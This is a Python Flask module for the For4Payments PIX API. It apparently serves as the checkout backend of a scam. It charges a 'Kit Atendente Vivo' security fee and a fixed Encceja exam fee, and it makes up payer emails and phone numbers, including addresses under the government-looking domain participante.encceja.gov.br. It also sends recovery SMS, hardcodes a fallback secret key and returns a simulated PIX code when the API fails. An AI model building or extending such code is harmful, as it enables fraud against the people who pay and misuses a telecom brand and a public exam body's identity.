import os
import requests
from datetime import datetime
from flask import current_app, request
from typing import Dict, Any, Optional
import random
import string
from transaction_tracker import track_transaction_attempt, get_client_ip, is_transaction_ip_banned
from sms_recovery import sms_recovery

class For4PaymentsAPI:
    API_URL = "https://app.for4payments.com.br/api/v1"

    def __init__(self, secret_key: str):
        self.secret_key = secret_key
        self.extra_headers = {}  # Headers adicionais para evitar problemas de 403 Forbidden

    def _get_headers(self) -> Dict[str, str]:
        """Get basic headers for API requests"""
        return {
            'Authorization': self.secret_key,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }

    def _generate_random_email(self, name: str) -> str:
        clean_name = ''.join(e.lower() for e in name if e.isalnum())
        random_num = ''.join(random.choices(string.digits, k=4))
        domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
        domain = random.choice(domains)
        return f"{clean_name}{random_num}@{domain}"

    def _generate_random_phone(self) -> str:
        """
        Gera um número de telefone brasileiro aleatório no formato DDDNNNNNNNNN
        sem o prefixo +55. Usado apenas como fallback quando um telefone válido não está disponível.
        """
        ddd = str(random.randint(11, 99))
        number = ''.join(random.choices(string.digits, k=9))
        return f"{ddd}{number}"

    def create_vivo_payment(self, user_data: Dict[str, Any]) -> Dict[str, Any]:
        """Criar um pagamento PIX para a taxa de equipamentos da Vivo"""
        try:
            # Verificar dados do usuário
            nome = user_data.get('nome', '').strip()
            cpf = user_data.get('cpf', '').strip()
            telefone = user_data.get('telefone', '').strip()
            email = user_data.get('email', '')
            valor = user_data.get('valor', 59.90)
            descricao = user_data.get('descricao', 'Taxa de Envio e Segurança - Kit Atendente Vivo')
            
            # Formatar o CPF (remover pontos e traços)
            cpf_limpo = cpf.replace(".", "").replace("-", "")
            
            # Formatar o telefone (remover parênteses, traços e espaços)
            telefone_limpo = telefone.replace("(", "").replace(")", "").replace("-", "").replace(" ", "")
            if not telefone_limpo:
                telefone_limpo = self._generate_random_phone()
            
            # Garantir que temos um email
            email_final = email
            if not email_final:
                email_final = self._generate_random_email(nome)
                
            # Calcular o valor em centavos
            amount_in_cents = int(float(valor) * 100)
                
            # Preparação dos dados para a API
            payment_data = {
                "name": nome,
                "email": email_final,
                "cpf": cpf_limpo,
                "phone": telefone_limpo,
                "paymentMethod": "PIX",
                "amount": amount_in_cents,
                "items": [{
                    "title": "Kit de Segurança",
                    "quantity": 1,
                    "unitPrice": amount_in_cents,
                    "tangible": False
                }]
            }
            
            # Chamar a API PIX
            headers = self._get_headers()
            response = requests.post(
                f"{self.API_URL}/transaction.purchase",
                json=payment_data,
                headers=headers,
                timeout=30
            )
            
            if response.status_code == 200:
                response_data = response.json()
                
                result = {
                    'id': response_data.get('id') or response_data.get('transactionId'),
                    'pixCode': response_data.get('pixCode') or response_data.get('pix', {}).get('code'),
                    'pixQrCode': response_data.get('pixQrCode') or response_data.get('pix', {}).get('qrCode'),
                    'expiresAt': response_data.get('expiresAt') or response_data.get('expiration'),
                    'status': response_data.get('status', 'pending')
                }
                
                return result
            else:
                error_message = f"Erro na API: {response.status_code} - {response.text}"
                raise ValueError(error_message)
            
        except Exception as e:
            current_app.logger.error(f"Erro ao processar pagamento Vivo: {str(e)}")
            return self._generate_mock_pix_payment(user_data)

    def _generate_mock_pix_payment(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Gera um código PIX de simulação quando a API real falha ou está indisponível"""
        # Simulação de dados PIX para testes
        mock_pix_code = "00020126580014BR.GOV.BCB.PIX01362e07742c-5d0d-4c07-a32c-96f0e2952f4c5204000053039865802BR5925SIMULACAO FOR4PAYMENTS6009SAO PAULO62070503***63047A12"
        mock_qr_code_url = "https://gerarqrcodepix.com.br/qr-code-pix/7/qrpix_f8e78b1c_mock.png"
        
        current_app.logger.warning("Usando PIX simulado em vez da API real")
        
        result = {
            "id": f"sim-{datetime.now().strftime('%Y%m%d%H%M%S')}-{random.randint(1000,9999)}",
            "status": "PENDING",
            "createdAt": datetime.now().isoformat(),
            "expiresAt": datetime.now().isoformat(),
            "pixCode": mock_pix_code,
            "pixQrCode": mock_qr_code_url,
            "amount": 59.90
        }
        
        # Enviar SMS de recuperação de vendas mesmo no PIX simulado
        try:
            transaction_id = result.get('id')
            current_app.logger.info(f"Enviando SMS de recuperação para transação simulada: {transaction_id}")
            sms_result = sms_recovery.send_recovery_sms(data, transaction_id)
            if sms_result.get('success'):
                current_app.logger.info(f"SMS de recuperação enviado com sucesso para {data.get('nome', data.get('name', 'Cliente'))} - Slug: {sms_result.get('slug')}")
            else:
                current_app.logger.warning(f"Falha ao enviar SMS de recuperação: {sms_result.get('error')}")
        except Exception as sms_error:
            current_app.logger.error(f"Erro ao enviar SMS de recuperação no PIX simulado: {str(sms_error)}")
        
        return result

    def create_pix_payment(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Create a PIX payment request"""
        try:
            # Validação e conversão do valor
            amount_in_cents = int(float(data['amount']) * 100)

            # Processamento do CPF
            cpf = ''.join(filter(str.isdigit, str(data['cpf'])))

            # Validação e geração de email se necessário
            email = data.get('email')
            if not email or '@' not in email:
                email = f"{cpf}@participante.encceja.gov.br"

            # Processamento do telefone
            phone = data.get('phone', '')
            if not phone or len(phone) < 10:
                phone = self._generate_random_phone()

            # Preparação dos dados para a API
            payment_data = {
                "name": data['name'],
                "email": email,
                "cpf": cpf,
                "phone": phone,
                "paymentMethod": "PIX",
                "amount": amount_in_cents,
                "items": [{
                    "title": "Kit de Segurança",
                    "quantity": 1,
                    "unitPrice": amount_in_cents,
                    "tangible": False
                }]
            }

            # Chamar a API
            headers = self._get_headers()
            response = requests.post(
                f"{self.API_URL}/transaction.purchase",
                json=payment_data,
                headers=headers,
                timeout=30
            )

            if response.status_code == 200:
                response_data = response.json()
            
                result = {
                    'id': response_data.get('id') or response_data.get('transactionId'),
                    'pixCode': (
                        response_data.get('pixCode') or 
                        response_data.get('copy_paste') or 
                        response_data.get('code') or 
                        response_data.get('pix_code') or
                        (response_data.get('pix', {}) or {}).get('code') or 
                        (response_data.get('pix', {}) or {}).get('copy_paste')
                    ),
                    'pixQrCode': (
                        response_data.get('pixQrCode') or 
                        response_data.get('qr_code_image') or 
                        response_data.get('qr_code') or 
                        response_data.get('pix_qr_code') or
                        (response_data.get('pix', {}) or {}).get('qrCode') or 
                        (response_data.get('pix', {}) or {}).get('qr_code_image')
                    ),
                    'expiresAt': response_data.get('expiresAt') or response_data.get('expiration'),
                    'status': response_data.get('status', 'pending')
                }

                return result
            else:
                error_message = f"Erro na API: {response.status_code} - {response.text}"
                raise ValueError(error_message)

        except Exception as e:
            current_app.logger.error(f"Erro ao processar pagamento: {str(e)}")
            raise ValueError(f"Erro ao processar pagamento: {str(e)}")

    def check_payment_status(self, payment_id: str) -> Dict[str, Any]:
        """Check the status of a payment"""
        try:
            current_app.logger.info(f"Verificando status do pagamento {payment_id}")
            
            # Configurar headers básicos
            headers = self._get_headers()

            response = requests.get(
                f"{self.API_URL}/transaction.getPayment",
                params={'id': payment_id},
                headers=headers,
                timeout=30
            )

            current_app.logger.info(f"Status check response (Status: {response.status_code})")
            current_app.logger.debug(f"Status check response body: {response.text}")

            if response.status_code == 200:
                payment_data = response.json()
                current_app.logger.info(f"Payment data received: {payment_data}")

                # Map For4Payments status to our application status
                status_mapping = {
                    'PENDING': 'pending',
                    'PROCESSING': 'pending',
                    'APPROVED': 'completed',
                    'COMPLETED': 'completed',
                    'PAID': 'completed',
                    'EXPIRED': 'failed',
                    'FAILED': 'failed',
                    'CANCELED': 'cancelled',
                    'CANCELLED': 'cancelled'
                }

                current_status = payment_data.get('status', 'PENDING').upper()
                mapped_status = status_mapping.get(current_status, 'pending')

                current_app.logger.info(f"Payment {payment_id} status: {current_status} -> {mapped_status}")

                # Se o pagamento foi confirmado, registrar evento para o Facebook Pixel
                if mapped_status == 'completed':
                    current_app.logger.info(f"[FACEBOOK_PIXEL] Evento de conversão para pagamento {payment_id}")

                # Mapear todos os possíveis campos de QR Code e código PIX na resposta
                pix_code = (
                    payment_data.get('pixCode') or 
                    payment_data.get('copy_paste') or 
                    payment_data.get('code') or 
                    payment_data.get('pix_code') or
                    (payment_data.get('pix', {}) or {}).get('code') or 
                    (payment_data.get('pix', {}) or {}).get('copy_paste')
                )

                pix_qr_code = (
                    payment_data.get('pixQrCode') or 
                    payment_data.get('qr_code_image') or 
                    payment_data.get('qr_code') or 
                    payment_data.get('pix_qr_code') or
                    (payment_data.get('pix', {}) or {}).get('qrCode') or 
                    (payment_data.get('pix', {}) or {}).get('qr_code_image')
                )

                current_app.logger.info(f"PIX code encontrado: {pix_code[:30] if pix_code else 'Nenhum'}")
                current_app.logger.info(f"QR code encontrado: {'Sim' if pix_qr_code else 'Não'}")

                return {
                    'status': mapped_status,
                    'original_status': current_status,
                    'pix_qr_code': pix_qr_code,
                    'pix_code': pix_code
                }
            elif response.status_code == 404:
                current_app.logger.warning(f"Payment {payment_id} not found")
                return {'status': 'pending', 'original_status': 'PENDING'}
            else:
                error_message = f"Failed to fetch payment status (Status: {response.status_code})"
                current_app.logger.error(error_message)
                return {'status': 'pending', 'original_status': 'PENDING'}

        except Exception as e:
            current_app.logger.error(f"Error checking payment status: {str(e)}")
            return {'status': 'pending', 'original_status': 'PENDING'}

    def create_encceja_payment(self, user_data: Dict[str, Any]) -> Dict[str, Any]:
        """Criar um pagamento PIX para a taxa do Encceja"""
        current_app.logger.info(f"Solicitação de pagamento Encceja recebida: {user_data}")

        # Validação dos dados obrigatórios
        if not user_data:
            current_app.logger.error("Dados de usuário vazios")
            raise ValueError("Nenhum dado de usuário fornecido")

        if not user_data.get('nome'):
            current_app.logger.error("Nome do usuário não fornecido")
            raise ValueError("Nome do usuário é obrigatório")

        if not user_data.get('cpf'):
            current_app.logger.error("CPF do usuário não fornecido")
            raise ValueError("CPF do usuário é obrigatório")

        # Valor fixo da taxa do Encceja
        amount = 53.20
        current_app.logger.info(f"Valor da taxa: R$ {amount:.2f}")

        # Sanitização e preparação dos dados
        try:
            # Formatar o CPF para remover caracteres não numéricos
            cpf_original = user_data.get('cpf', '')
            cpf = ''.join(filter(str.isdigit, str(cpf_original)))
            if len(cpf) != 11:
                current_app.logger.warning(f"CPF com formato inválido: {cpf_original} → {cpf} ({len(cpf)} dígitos)")
            else:
                current_app.logger.info(f"CPF formatado: {cpf[:3]}...{cpf[-2:]}")

            # Gerar um email aleatório baseado no nome do usuário
            nome = user_data.get('nome', '').strip()
            email = self._generate_random_email(nome)
            current_app.logger.info(f"Email gerado: {email}")

            # Limpar o telefone se fornecido, ou gerar um aleatório
            phone_original = user_data.get('telefone', '')
            phone_digits = ''.join(filter(str.isdigit, str(phone_original)))

            if not phone_digits or len(phone_digits) < 10:
                phone = self._generate_random_phone()
                current_app.logger.info(f"Telefone inválido '{phone_original}', gerado novo: {phone}")
            else:
                phone = phone_digits
                current_app.logger.info(f"Telefone formatado: {phone}")

            current_app.logger.info(f"Preparando pagamento para: {nome} (CPF: {cpf[:3]}...{cpf[-2:]})")

            # Formatar os dados para o pagamento
            payment_data = {
                'name': nome,
                'email': email,
                'cpf': cpf,
                'amount': amount,
                'phone': phone,
                'description': 'Kit Vivo'
            }

            current_app.logger.info("Chamando API de pagamento PIX")
            result = self.create_pix_payment(payment_data)
            current_app.logger.info(f"Pagamento criado com sucesso, ID: {result.get('id')}")
            return result

        except Exception as e:
            current_app.logger.error(f"Erro ao processar pagamento Encceja: {str(e)}")
            raise ValueError(f"Erro ao processar pagamento: {str(e)}")

class MockFor4PaymentsAPI:
    """Versão de simulação da API para testes sem API key"""
    
    def create_vivo_payment(self, user_data: Dict[str, Any]) -> Dict[str, Any]:
        """Simula a criação de um pagamento PIX para fins de teste"""
        # Simulação de dados PIX para testes
        mock_pix_code = "00020126580014BR.GOV.BCB.PIX01362e07742c-5d0d-4c07-a32c-96f0e2952f4c5204000053039865802BR5925SIMULACAO FOR4PAYMENTS6009SAO PAULO62070503***63047A12"
        mock_qr_code_url = "https://gerarqrcodepix.com.br/qr-code-pix/7/qrpix_f8e78b1c_mock.png"
        
        current_app.logger.warning("Usando PIX simulado em vez da API real")
        
        return {
            "id": f"sim-{datetime.now().strftime('%Y%m%d%H%M%S')}-{random.randint(1000,9999)}",
            "status": "PENDING",
            "createdAt": datetime.now().isoformat(),
            "expiresAt": datetime.now().isoformat(),
            "pixCode": mock_pix_code,
            "pixQrCode": mock_qr_code_url,
            "amount": 59.90
        }

def create_payment_api(secret_key: Optional[str] = None) -> For4PaymentsAPI:
    """Factory function to create For4PaymentsAPI instance"""
    if secret_key is None:
        secret_key = os.environ.get("FOR4PAYMENTS_SECRET_KEY", "ca46d320-d0f6-4387-9de4-2c9a91861725")
    
    # Always use the real API with the configured key
    return For4PaymentsAPI(secret_key)